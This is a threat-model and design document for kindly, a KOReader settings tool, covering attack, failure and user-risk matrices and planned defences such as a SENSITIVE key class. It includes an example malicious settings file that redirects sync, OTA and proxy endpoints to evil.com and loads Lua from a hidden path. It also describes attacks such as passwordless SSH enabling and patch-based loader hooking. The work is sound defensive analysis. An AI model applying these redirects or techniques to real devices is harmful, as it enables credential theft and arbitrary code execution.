# 87 — Security matrices for W31–W34 trust layer
### *Failure, adversary, naive-user, and power-user perspectives*

Companion to `81-personas-and-threat-model.md`. This document is the
design input for plugin hash verification, expanded doctor checks, and
author/source trust metadata. Built from a full codebase red-team
analysis (2026-04-23).

Date: 2026-04-23.
Status: design input for W31–W34.

---

## 0. The key insight the red-team surfaced

The most dangerous attack in kindly today is not a fat `.kset` with
malicious plugins — that requires `--accept-plugins` and is visibly
scary. The most dangerous attack is a **lean `.kset.yaml` that looks
like a cosmetic tweak but redirects network endpoints**.

```yaml
kindly_setup: v1
meta:
  name: "Beautiful Night Reading"
  author: "KOReader Community"
settings:
  night_mode: true
  autowarmth_activate: 1
  kosync:
    custom_server: "https://evil.com/kosync"   # ← steals credentials
  ota_server: "https://evil.com/ota"           # ← pushes malicious OTA
  http_proxy: "http://evil.com:8080"           # ← MITMs all traffic
  http_proxy_enabled: true
  extra_plugin_paths: "/mnt/us/documents/.hidden/plugins"  # ← loads arbitrary Lua
```

No `--accept-plugins` needed. No fat archive. User sees "7 changes" in
the diff, 2 of which look like night-reading settings. The other 5 are
network redirects and a code-execution vector that a non-expert won't
recognize. kindly writes them without any special warning because all
seven are classified USER.

The `extra_plugin_paths` line is the worst: it tells KOReader to load
plugins from an arbitrary directory. If the attacker can drop files
there (via LocalSend, a prior Setup, or shared storage), they get
arbitrary Lua execution on next KOReader launch — without ever shipping
a fat archive or triggering `--accept-plugins`.

This attack shapes every matrix below.

---

## 1. Failure matrix

What can go wrong *without* a bad actor — bugs, crashes, user mistakes,
environmental surprises.

| # | Failure mode | Trigger | Current protection | Impact | Residual risk |
|---|-------------|---------|-------------------|--------|---------------|
| F1 | **Power loss mid-write** | USB disconnect, kernel panic, device battery death | `safeWrite` 6-step atomic pipeline: `.tmp` → fsync → rotate `.old` → rename → fsync → verify. KOReader's loader falls back to `.old`. | Settings file always recoverable from either `path` or `path.old`. | None — crash-safe by construction. |
| F2 | **Corrupted `.kset` archive** | Bit-rot, partial download, truncated copy | `unpackSetup` 7-step acceptance chain: list → path-safety scan → manifest parse → Zod validate → per-file hash + byte check. | Rejects on any mismatch. Clear error message. | None — belt-and-suspenders. |
| F3 | **User applies wrong YAML to wrong device** | Two Kindles, grabbed the wrong config | Compat check: device family + KOReader version range. `--dry-run` shows diff before write. | Soft: warns on family mismatch. `--force` bypasses. | Medium. Compat is opt-in per-manifest; some manifests won't declare device constraints. Add doctor check "device changed since last pull." |
| F4 | **YAML billion-laughs / deep nesting** | Malformed or adversarial YAML from any source | None. `yaml` v2 library has no configured limits on alias expansion, recursion depth, or document size. | Host machine memory exhaustion / CPU hang. | **Open gap.** Add `maxAliasCount` + doc size limit to yaml parse calls. |
| F5 | **Disk full on device** | Large fat Setup, many backups, limited Kindle storage | No pre-flight disk space check. `safeWrite` will fail at write step; verify-and-rollback restores `.old`. | Settings file safe (rollback works). But plugin/patch files may be partially installed if disk fills during multi-file copy. | Medium. Add free-space check to doctor + pre-import. |
| F6 | **KOReader version drift** | User updates KOReader; new keys added, old keys deprecated | Schema warns on unknown keys. Compat block if version outside declared range. | Soft: old Setup may set deprecated keys (ignored by new KOReader) or miss new keys (defaults apply). | Low. Not harmful, just incomplete. |
| F7 | **Stale secret denylist** | KOReader adds a new credential key; kindly's `classify.ts` not yet updated | New key defaults to USER → exported in `pull`, accepted in `import`. | Secret leakage: user's new credential appears in shared YAML. | **Open gap.** Denylist must track KOReader releases. Consider inverting to allowlist for new keys in `--strict` mode. |
| F8 | **`restore` from untrusted archive** | User receives a "backup" tarball from someone; runs `kindly restore`. **Confirmed:** `restore.ts:110` calls `extractTarGz({ archivePath, destRoot: mount.koreaderRoot })` directly — zero path validation. The `listTarGz` at line 73 is display-only (used for dry-run listing and entry counting). Contrast with `unpackSetup` which pre-scans every entry via `isSafeRelativePath` before extraction. | Path traversal writes files outside `koreaderRoot`. Depends on host `tar` implementation (most modern tar strips `..` by default, but not guaranteed). | **Open gap.** Port the `listTarGz` + `isSafeRelativePath` pre-scan from `unpackSetup` to `restore`. |
| F9 | **Backup directory unbounded growth** | Every apply/import creates timestamped backup in `.kindly/backups/` | No rotation. History rotates at 500 entries; backups do not. | Gradual storage consumption on device. | Low. Add rotation policy (keep N most recent or cap total bytes). |

---

## 2. Bad actor matrix

What an adversary (persona U7) can do, and what stops them at each
layer.

### 2.1 Attack surface inventory

```
                          ┌─────────────────────────────┐
  Distribution channels   │ Reddit, email, USB, gist,  │
  (no central registry)   │ messaging app, forum        │
                          └──────────┬──────────────────┘
                                     │
                          ┌──────────▼──────────────────┐
                          │ .kset.yaml (lean) or        │
  Artifact layer          │ .kset (fat tar.gz)          │
                          └──────────┬──────────────────┘
                                     │
                          ┌──────────▼──────────────────┐
  Validation layer        │ Zod schema, path safety,    │
  (current)               │ hash verify, compat check   │
                          └──────────┬──────────────────┘
                                     │
                          ┌──────────▼──────────────────┐
  Policy layer            │ Secret filter, --accept-*   │
  (GAPS HERE)             │ flags, --dry-run preview    │
                          └──────────┬──────────────────┘
                                     │
                          ┌──────────▼──────────────────┐
  Device layer            │ settings.reader.lua         │
                          │ plugins/, patches/           │
                          └─────────────────────────────┘
```

### 2.2 Attack matrix

| # | Attack | Vector | Requires | Current defense | Severity | W31–W34 closes it? |
|---|--------|--------|----------|-----------------|----------|---------------------|
| A1 | **Network endpoint redirect** (kosync, OTA, proxy, calibre, OPDS, translation, Z-Library) | Lean `.kset.yaml` sets `kosync.custom_server`, `ota_server`, `http_proxy`, etc. | User imports any Setup. No special flags. | None. These keys are USER-classified. Diff shows them but they look like normal settings. | **Critical** | **W31 must add SENSITIVE key class.** Import warns prominently; `--strict-imports` blocks. |
| A2 | **Credential harvesting via endpoint + credential combo** | Setup redirects `kosync.custom_server` to attacker; user's real `kosync.userkey` stays in place (SECRET = protected from overwrite). Next sync sends real creds to fake server. | Same as A1. The secret protection actually helps the attacker — creds stay real while endpoint changes. | Ironic: secret denylist protects creds from being overwritten, making the redirect more effective. | **Critical** | **W31: SENSITIVE class for endpoint keys. Mandatory warning when any endpoint changes.** |
| A3 | **Arbitrary code execution via fat Setup plugins** | `.kset` contains `evil.koplugin/main.lua` with `os.execute()`. KOReader loads it on next boot. | `--accept-plugins` flag. User must explicitly opt in. | Flag gate + disclosure text. But no scan of what the Lua actually does. | **Critical** (if user accepts) | Partially. W32 hashes against catalog (detects tampered known plugins). But novel plugins have no known-good hash. **W36 Lua static scanner needed.** |
| A4 | **Arbitrary code execution via patches** | `.kset` ships `patches/evil.lua` with runtime monkey-patches. KOReader loads patches at startup. | `--accept-patches` flag. | Flag gate only. No content scan. | **Critical** (if user accepts) | **Not closed.** W37 patch scanning needed. |
| A5 | **Plugin directory replacement** | Fat Setup ships plugin with same name as built-in (e.g. `reader.koplugin`). `installPluginFiles` does `rmSync(target, {recursive: true})` then writes attacker's version. | `--accept-plugins`. | Path safety prevents traversal, but name-squatting is not checked. | **High** | W32 partially (catalog hash mismatch). **Add: warn when overwriting a built-in plugin.** |
| A6 | **Typosquatting Setup names** | "night-readinq" (q not g) mimics popular "night-reading" Setup. | Social engineering. No technical gate. | `meta.author` is unsigned free text. No verification. | **High** | W33 reserves `author_key_id`. W39 adds detached minisign verification. **Until then: display-only, no enforcement.** |
| A7 | **Manifest tampering in transit** | MITM on HTTP download, or modified file on shared drive. | Unencrypted transport or shared storage. | Content hash exists but user must manually compare. No `--expect-hash` flag on import. | **High** | **W31-W34: add `--expect-hash` flag to `setup import`.** Simple, high-value. |
| A8 | **Author impersonation** | Anyone can set `meta.author: "trusted-person"`. | No signature verification. | None. | **High** | W33 reserves fields. W39 minisign. **Gap between W33 and W39: field exists but is unverified.** |
| A9 | **Compression bomb** | Small `.kset` that extracts to gigabytes. **Confirmed:** `unpack.ts:83` runs `extractTarGz` BEFORE byte checks at lines 121–145. Bytes hit tmpdir disk before any manifest-level validation. | User imports a fat Setup. | Extraction goes to `os.tmpdir()` staging dir (cleaned in `finally`). But disk fills before cleanup. | **Medium** | **Add: pre-extraction size estimate from tar headers; reject if > threshold.** |
| A10 | **`replace` mode config wipe** | Setup with `apply_mode: "replace"` and `settings: {}` wipes all USER keys. | User imports. Diff shows all removals. | Diff + safety snapshot. User must read the diff. | **Medium** | **Add: warn when `replace` mode removes > N keys (e.g. 50).** |
| A11 | **SSH enable** | Setup sets `SSH_allow_no_password: true`, `SSH_autostart: true`, `SSH_port: 22`. Three keys that together open a passwordless remote shell. | User imports lean Setup. | None today. | **High** | **W31 SENSITIVE class. All four SSH keys must be in it.** |
| A13 | **Code execution via `extra_plugin_paths`** | Lean `.kset.yaml` sets `extra_plugin_paths` to a directory the attacker controls (e.g. via a prior LocalSend file drop or a path on shared storage). KOReader loads plugins from that path on next launch. **No `--accept-plugins` gate fires** — that gate only checks fat archive plugin files, not this settings key. | User imports any lean Setup. No special flags. | None. `extra_plugin_paths` is classified USER. | **Critical** | **W31: `extra_plugin_paths` must be SENSITIVE. This is a code-exec vector through settings alone.** |
| A12 | **YAML parsing bomb** | Billion-laughs via alias expansion in crafted `.kset.yaml`. | User imports lean Setup. | None. yaml v2 library has large default limits. | **Medium** | **Add maxAliasCount to yaml parse options.** |
| A14 | **Two-stage directory pre-staging** | Setup A sets `LocalSend_autostart: true` + `LocalSend_save_dir: "/mnt/us/.plugins"` (both SENSITIVE, user approves — looks like LocalSend config). Attacker then sends malicious `.lua` files via LocalSend to that dir. Setup B (or same author, later) sets `extra_plugin_paths: "/mnt/us/.plugins"` (SENSITIVE, user approves — looks like a plugin path config). KOReader loads the pre-staged attacker Lua on next launch. | User imports two Setups that each pass the per-import SENSITIVE gate. | W31 SENSITIVE class surfaces each change, but each Setup is gated in isolation. No cross-Setup correlation. | **Medium** (requires two user actions + LocalSend enabled) | **Not closed by W31–W34.** Per-import gating has this structural blind spot — `extra_plugin_paths` referencing a directory that another SENSITIVE key writes to is a cross-Setup correlation the import gate cannot see. Mitigation surface is doctor: a future `doctor --before-apply` could flag "this Setup sets `extra_plugin_paths` to a directory LocalSend/download/inbox writes to." Deferred; documented here so the SENSITIVE gate isn't claimed to close it. |

### 2.3 Defense-in-depth gap analysis

```
Layer 1 — FORMAT INTEGRITY          ██████████ 10/10  (hash, path, schema, symlink)
Layer 2 — CRASH SAFETY              ██████████ 10/10  (atomic write, .old fallback, verify)
Layer 3 — SECRET PROTECTION         ████████░░  8/10  (denylist; stale-list risk)
Layer 4 — POLICY GATES              ████░░░░░░  4/10  (--accept-* flags but no SENSITIVE class)
Layer 5 — CODE SCANNING             ░░░░░░░░░░  0/10  (no Lua analysis at all)
Layer 6 — PROVENANCE                ██░░░░░░░░  2/10  (hash exists; no signatures, no TOFU)
Layer 7 — USER COMPREHENSION AIDS   ████░░░░░░  4/10  (diff + taxonomy; no danger highlighting)
```

W31–W34 target: Layer 4 → 8/10, Layer 6 → 5/10, Layer 7 → 7/10.
W35–W39 target: Layer 5 → 6/10, Layer 6 → 8/10.

---

## 3. Naive user matrix (U4, U5)

Users who interact through GUI only. Can't read diffs. Don't know what
`kosync` means. Their only signals are: the Setup name, the author
string, and whatever the GUI shows them before they click "Apply."

| # | Scenario | What they see | What actually happens | Harm | Design requirement |
|---|----------|-------------|---------------------|------|-------------------|
| N1 | **Apply "Beautiful Night Reading" from Reddit** | Name sounds nice. Author says "KOReader Community." Preview shows 6 changes, 2 about night mode. Other 4 are settings they don't recognize. | `kosync.custom_server` redirected. Their reading sync now goes to attacker. | Credential theft, reading history exfiltration. They'll never know. | **GUI must separate "cosmetic" changes from "network/security" changes with visual hierarchy.** Red/orange for network endpoint changes. |
| N2 | **Apply a Setup from a YouTube tutorial** | Tutorial says "paste this command." They paste. | `--force --accept-plugins` bypasses all gates. Malicious plugin installed. | Arbitrary code execution on device. | **GUI must never expose a "skip all warnings" button.** Each gate is a separate explicit consent. CLI: consider removing compound `--force --accept-plugins`. |
| N3 | **Plugin they don't understand gets replaced** | Setup ships `statistics.koplugin` (built-in). Preview says "1 plugin to install." User thinks it's adding something new. | Their statistics plugin is replaced with a modified version that phones home. | Data exfiltration. User's reading stats sent to attacker. | **Preview must say "REPLACES existing plugin: statistics" not just "installs plugin: statistics."** Distinguish install vs. replace. |
| N4 | **replace mode wipes their config** | Setup has `apply_mode: replace`. Preview shows "47 settings removed." User doesn't understand what that means. | Factory-reset of KOReader config. All their customizations gone. | Lost configuration. Frustration. May think Kindle is broken. | **GUI must show "replace mode" as a prominent warning banner.** "This Setup will remove 47 of your current settings and keep only the ones it defines. This is unusual." |
| N5 | **"My Kindle is broken" after applying** | `font_size: 1`, `screen_rotation_mode: 3`. KOReader launches with unreadable text, upside down. | Semantically destructive but type-valid settings. | User thinks device is bricked. May factory-reset unnecessarily. | **Taxonomy severity "breaking" must block in GUI without explicit override.** Font size < 8 or > 72 = breaking. Rotation mode change = functional warning. |
| N6 | **Shares their own pull output without realizing it has secrets** | Runs pull, gets YAML, shares on forum for help. | If using `--full` or if new secret keys exist outside denylist, credentials appear in the YAML. | Password/PIN leak on public forum. | **`pull` output must have a visible header: "Contains your personal settings. Do not share publicly without reviewing."** |

### The BREAKING severity class (N5 design requirement)

The taxonomy already assigns severity per key (`trivial`, `visual`,
`functional`). N5 shows we need a fourth level: `breaking`.

```
trivial    → no visible effect (internal counters, cache flags)
visual     → appearance only (font face, color mode, status bar style)
functional → changes behavior (gesture maps, page turn mode, sync interval)
breaking   → can render device unusable or require manual intervention
```

**BREAKING criteria** (value-dependent, not just key-dependent):

| Condition | Example | Why it's breaking |
|-----------|---------|------------------|
| `font_size < 8` or `font_size > 72` | `font_size: 1` | Text unreadable; user can't navigate menus to fix it |
| `screen_rotation_mode` changed | `screen_rotation_mode: 3` | Screen upside-down on hardware with no auto-rotate |
| `cre_interline_space_percent < 50` | `cre_interline_space_percent: 1` | Lines overlap; text illegible |
| `screen_dpi` outside `[100, 600]` | `screen_dpi: 10` | UI elements too small to tap |

**Behavior:**

- **CLI default:** print warning with explanation. Proceed unless
  `--strict-imports`.
- **CLI `--strict-imports`:** block.
- **GUI:** block with explicit override. Red banner: "This Setup
  includes changes that may make your device difficult to use.
  Review each one."
- **`setup inspect --json`:** `"severity": "breaking"` on affected
  keys, with `"reason"` field.

Unlike SENSITIVE (key-based classification), BREAKING is
**value-dependent** — `font_size: 14` is fine, `font_size: 1` is
breaking. This means the check runs at import time against the actual
values in the manifest, not at schema definition time.

### Naive user design principles

1. **Traffic-light system for changes.** Green = cosmetic/visual.
   Yellow = functional (changes behavior). Orange = breaking (may render
   device hard to use). Red = security-relevant (network endpoints, SSH,
   debug flags, code execution). Derived from key classification + value
   range checks.

2. **No compound bypass.** Each safety gate requires separate consent.
   "Accept plugins" and "accept patches" and "accept network changes"
   are three separate confirmations, never one.

3. **Replace mode is exceptional.** Default display should make replace
   mode look unusual and alarming, because it is.

4. **Undo is always one action away.** GUI top-bar "Undo" button.
   Not buried in a menu. Not "rollback --to 2026-04-23T14:30:00Z."

---

## 4. Technical user matrix (U1, U2)

Power users who audit source, pipe JSON, verify hashes, and want
cryptographic proof of provenance.

| # | Scenario | What they need | Current gap | Design requirement |
|---|----------|---------------|-------------|-------------------|
| T1 | **Audit a stranger's .kset before import** | `setup inspect --verbose --json` showing: every setting change, every plugin file hash compared to catalog, every Lua file scanned for dangerous calls, signature status, all paths that would be touched. | No Lua scanning. No catalog hash comparison. No signature. Inspect exists but is shallow. | **`setup inspect` must be the single audit surface.** JSON output with `warnings[]`, `signature_status`, `lua_scan_results[]`, `catalog_hash_mismatches[]`. |
| T2 | **Block on any hash mismatch** | `--strict-imports` flag: any hash mismatch, suspicious key, or unknown plugin → exit non-zero, zero writes. | No `--strict-imports`. `--strict` only validates key names against schema. | **W35: `--strict-imports` flag.** Separate from `--strict` (schema validation). |
| T3 | **Verify manifest provenance** | Detached minisign signature (`file.kset.minisig`). Verify with a public key they obtained out-of-band. | No signature support. `meta.author` is unsigned free text. | **W39: `--verify-key <path>` on import.** Signature status shown in inspect and import preview. Unsigned manifests explicitly labeled "UNSIGNED." |
| T4 | **Pin a known-good hash on import** | `setup import alice.kset --expect-hash sha256:abc123...` — refuses if hash doesn't match. | Hash displayed but not gated. | **Add `--expect-hash` to `setup import`.** Trivial to implement, high trust value. |
| T5 | **Audit all network-relevant settings in one view** | `setup inspect` groups changes by security domain. "Network endpoints: 3 changes. SSH: 1 change. Code execution: 0. Cosmetic: 12 changes." | Taxonomy groups by functional category (fonts, status bar, etc.), not by security domain. | **Add security-domain grouping to inspect/preview.** Orthogonal to taxonomy grouping; both should be available. |
| T6 | **Script the import flow** | JSON mode for every decision point. Machine-parseable warnings. Exit codes that distinguish "clean" from "warnings" from "blocked." | Exit codes: 0/1/2 only. Warnings go to stderr as text. | **Structured exit codes:** 0 = clean, 1 = error, 2 = arg error, 3 = blocked by policy (--strict), 4 = warnings present (non-blocking). JSON output wraps warnings as `{warnings: [...]}`. |
| T7 | **Compare plugin file hashes against catalog** | Per-plugin: `{plugin: "statistics.koplugin", catalog_hash: "sha256:...", archive_hash: "sha256:...", match: false}`. | Catalog exists but has no per-file hashes. Plugin entries have metadata only. | **W32: extend catalog with per-file hashes for the KOReader version the catalog was built from.** |
| T8 | **Reproducible build of kindly itself** | Verify the kindly binary they downloaded matches a published hash / attestation. | No reproducible build story. No SLSA attestation. Releases are unsigned. | **W43-W45: build reproducibility, dependency policy, release signing.** Separate track, not blocking W31-W34. |

### Technical user design principles

1. **Every gate is a flag.** No interactive prompts in CI/script
   contexts. `--accept-plugins`, `--accept-patches`,
   `--accept-sensitive`, `--strict-imports`, `--expect-hash`,
   `--verify-key` — all composable, all have JSON equivalents.

2. **Inspect is the audit oracle.** One command that answers every
   question about a Setup before import. If inspect doesn't surface it,
   it's a bug.

3. **Exit codes are a contract.** Document them. Don't change them.
   Scripts depend on them.

4. **No silent degradation.** If a signature file is missing, say
   "UNSIGNED" — don't silently proceed. If a plugin isn't in the
   catalog, say "UNCATALOGUED" — don't skip the check.

---

## 5. The SENSITIVE key class (W31 core deliverable)

The single highest-impact change for W31. Creates a third security
classification alongside SECRET and EPHEMERAL.

### Classification

```
SECRET     → never exported, never imported, never shown
EPHEMERAL  → excluded by default, --full includes
USER       → normal flow
SENSITIVE  → normal flow BUT flagged with mandatory warning on import
```

### Proposed SENSITIVE keys

Grouped by threat domain. 23 keys total.

**Code execution (settings-level bypass of `--accept-plugins`):**

| Key | Why it's dangerous |
|-----|-------------------|
| `extra_plugin_paths` | **Redirects KOReader's plugin loader to arbitrary directories.** A lean `.kset.yaml` can set this — no `--accept-plugins` gate fires because it's a settings key, not a shipped file. This is a code-exec vector via settings alone. |

**Network endpoint redirection:**

| Key | Why it's dangerous |
|-----|-------------------|
| `kosync.custom_server` | Redirects reading-sync traffic (creds included) |
| `ota_server` | Controls OTA update source (arbitrary code install) |
| `http_proxy` | MITMs all HTTP traffic |
| `http_proxy_enabled` | Activates the proxy |
| `calibre_wireless_url` | Calibre connection endpoint |
| `opds_servers` | OPDS catalog servers (network endpoints) |
| `trans_server` | Translation service endpoint |
| `zlibrary_base_url` | Z-Library mirror URL |

**SSH surface (full set — KOReader ships an SSH server):**

| Key | Why it's dangerous |
|-----|-------------------|
| `SSH_allow_no_password` | Enables passwordless SSH access — remote shell without auth |
| `SSH_autostart` | Auto-starts SSH daemon on KOReader launch |
| `SSH_key_only_auth` | Changes SSH authentication mode |
| `SSH_port` | SSH port; non-default port can bypass firewall expectations |

**Network services auto-start:**

| Key | Why it's dangerous |
|-----|-------------------|
| `httpinspector_autostart` | Auto-starts HTTP traffic inspector — exposes network debug surface |
| `httpinspector_port` | Port for the HTTP inspector service |
| `LocalSend_autostart` | Auto-starts LocalSend — device becomes discoverable on LAN |
| `LocalSend_port` | LocalSend network port |

**Directory redirection (file-write targets):**

| Key | Why it's dangerous |
|-----|-------------------|
| `LocalSend_save_dir` | Controls where received files are saved |
| `LocalSend_ext_dirs` | External directories exposed to LocalSend |
| `home_dir` | Changes KOReader's home directory (affects all path resolution) |
| `download_dir` | Where downloads land |
| `inbox_dir` | Where received/imported files land |

**Debug surface:**

| Key | Why it's dangerous |
|-----|-------------------|
| `debug` | Enables debug logging — may expose internal state, secrets in logs |

### Behavior on import

- **Default mode:** print prominent warning block. List every SENSITIVE
  key being changed, old value → new value. Require explicit
  `--accept-sensitive` flag (or per-key `--accept-key=ota_server`). Flag
  name chosen over `--accept-network-changes` because the class covers
  code execution (`extra_plugin_paths`), SSH, debug, and directory
  redirection — not only network. Rationale in
  [`88-sensitive-keys-spec.md`](./88-sensitive-keys-spec.md) §3.1.
- **`--strict-imports`:** block. Exit non-zero. No writes.
- **GUI:** red-highlighted section in preview. Separate confirmation
  step. "This Setup changes where your device connects. Review each
  change."

### Behavior on export/pull

SENSITIVE keys ARE exported (they're not secrets). But the YAML output
includes a comment block:

```yaml
# WARNING: The following keys control network endpoints.
# Recipients of this file should review them before importing.
kosync:
  custom_server: "https://my-server.com/kosync"
```

---

## 6. Priority matrix for W31–W34

What to build, in what order, based on the matrices above.

| Priority | Item | Closes | Effort | Risk if deferred |
|----------|------|--------|--------|-----------------|
| **P0** | SENSITIVE key class (23 keys) + `--accept-sensitive` gate | A1, A2, A11, A13, N1 | 2–3 days | Critical attacks remain trivial; `extra_plugin_paths` is ungated code-exec |
| **P0** | `--expect-hash` flag on `setup import` | A7, T4 | 0.5 day | Trust gap with no workaround |
| **P1** | Catalog per-file hashes + hash comparison on import | A3 (partial), A5, T7 | 2–3 days | Tampered known plugins go undetected |
| **P1** | Replace-mode warning for large removals | A10, N4 | 0.5 day | Config wipe looks like normal import |
| **P1** | Path validation in `restore` command | F8 | 0.5 day | Path traversal in trusted-looking flow |
| **P2** | `--strict-imports` compound flag | T2 | 1 day | U1 must compose flags manually |
| **P2** | Doctor: free-space check, stale-backup rotation | F5, F9 | 1 day | Silent disk-full on device |
| **P2** | YAML parse limits (maxAliasCount) | F4, A12 | 0.5 day | DoS via crafted YAML |
| **P2** | Inspect: security-domain grouping | T5 | 1 day | Audit requires reading raw diffs |
| **P3** | Reserved manifest meta fields (version, author_key_id, supersedes) | A8, T3 | 0.5 day | Schema migration needed later |
| **P3** | Built-in plugin overwrite warning | A5, N3 | 1 day | Silent replacement of core plugins |
| **P3** | Pre-extraction size estimate for fat archives | A9 | 1 day | Compression bomb fills disk |

**Not in W31–W34** (deferred to W35–W39 per roadmap):
- Lua static scanner (A3, A4 full fix)
- Minisign signature verification (A6, A8 full fix)
- TOFU author store
- Structured exit codes beyond 0/1/2 (T6)

---

## 7. Summary of red-team findings by severity

| Severity | Count | Key findings |
|----------|-------|-------------|
| **Critical** | 4 | Network endpoint redirect (A1), credential harvesting via redirect+secret-protection combo (A2), arbitrary Lua execution via fat plugins/patches (A3/A4), **code execution via `extra_plugin_paths` settings key bypassing `--accept-plugins` gate (A13)** |
| **High** | 4 | No manifest signatures (A6/A8), plugin directory name-squatting (A5), SSH enable (A11), manifest tampering in transit (A7) |
| **Medium** | 5 | YAML bomb (A12), replace-mode config wipe (A10), compression bomb (A9), restore path traversal (F8), stale secret denylist (F7) |
| **Low** | 4 | Backup growth (F9), safeWrite TOCTOU (mitigated by vfat), Lua parser DoS (requires device access), prototype pollution (mitigated by yaml v2) |

Two critical findings shape W31's priority:

1. **kindly's secret protection makes the endpoint-redirect attack
   more effective** (A2) — the creds stay real while the destination
   changes.

2. **`extra_plugin_paths` is a code-exec vector that bypasses every
   existing gate** (A13) — no fat archive, no `--accept-plugins`, no
   `--accept-patches`. A lean YAML file sets it, and KOReader loads
   arbitrary Lua from whatever directory it points to.

---

## 8. Pressure-test results (verified in code, 2026-04-23)

Three claims from the initial red-team were verified against the actual
source:

**A9 — compression bomb reaches disk: CONFIRMED.**
`unpack.ts:83` calls `extractTarGz({ archivePath, destRoot: stage })`
before any manifest-level byte checks (lines 121–145). The path-safety
pre-scan (lines 64–68) runs first (good), but size validation only
happens after extraction. A compression bomb fills `os.tmpdir()` before
the code can reject it. The `finally` block (line 149) cleans up, but
by then the disk is already full.

**F8 — restore has no path validation: CONFIRMED.**
`restore.ts:110` calls `extractTarGz({ archivePath, destRoot:
mount.koreaderRoot })` with zero pre-scan. The `listTarGz` at line 73
is display-only (dry-run listing + entry counting). Compare
`unpackSetup` which pre-scans every entry via `isSafeRelativePath`
before calling `extractTarGz`. The omission is a straight copy-paste
from `unpackSetup` that would close this gap.

**A13 — `extra_plugin_paths` bypasses `--accept-plugins`: CONFIRMED.**
`--accept-plugins` (checked at `importSetup.ts:185`) gates on
`shippedPlugins.length > 0` — i.e. whether the fat archive ships plugin
files. The `extra_plugin_paths` key is a regular settings value in the
manifest's `settings:` block, classified USER, processed by the
standard merge path with zero special handling. KOReader's plugin loader
reads this key to discover additional plugin directories, making it a
settings-level code-execution vector that requires no fat archive and no
special CLI flags.

---

## 9. KOReader plugin loader source analysis (2026-04-23)

Source-level audit of `pluginloader.lua` and `userpatch.lua` on the
mounted Kindle. Full findings in `97-pluginloader-analysis.md`.
Three structural findings that reshape the hardening plan.

**PL-1 — `plugins_disabled` covers all plugin paths (good news).**
The quarantine mechanism works for `extra_plugin_paths` plugins too.
`pluginloader.lua:170` checks the disabled dict for every lookup
path, not just the default `plugins/` directory.

**PL-2 — disabled plugins still execute `_meta.lua` (bad news).**
`pluginloader.lua:171` swaps `mainfile = metafile` for disabled
plugins, but `_load` at line 202 still does `pcall(dofile, mainfile)`.
A malicious `_meta.lua` runs on every boot even when the plugin is
"disabled." Quarantine alone is not sufficient — kindly must sanitize
or replace `_meta.lua` at install time.

**PL-3 — patches run unconditionally with no disable mechanism (worst news).**
`userpatch.lua:66-84` does `pcall(dofile, fullpath)` on every
`patches/*.lua` file matching the priority pattern. No disabled check.
No settings key. Priority `0` patches run before `G_reader_settings`
is even loaded (`reader.lua:24-26`). Additionally, `userpatch.lua`
exports `debug.getupvalue` and `debug.setupvalue` as first-class API
— a priority-1 patch can hook `pluginloader.createPluginInstance`
and inject code into every plugin that loads after it, including
hash-verified bundled plugins.

**S4 confirmed PL-3 in practice.** A fat Setup shipping a
BUNDLED_MATCH plugin decoy alongside a scanner-evading patch passed
every trust gate kindly has — including `--strict-imports`. The patch
landed in `koreader/patches/` and executed on boot. See
`96-red-team-v0.11.1.md` §S4.

**Structural limit (stated plainly):** KOReader plugins and patches
run with full process privilege. There is no OS sandbox. There is no
Lua sandbox (LuaJIT FFI bypasses `setfenv`). Against a skilled
attacker targeting the uncatalogued/patch path, kindly's defense is
**making the trust decision visible and explicit** — not proving the
code is safe. The scanner is an advisory for unsophisticated payloads.
The catalog hash is the only proof-grade defense, and it only covers
the 37 bundled plugins.

This limit should be visible to users, not hidden behind "scanner
findings: 0."
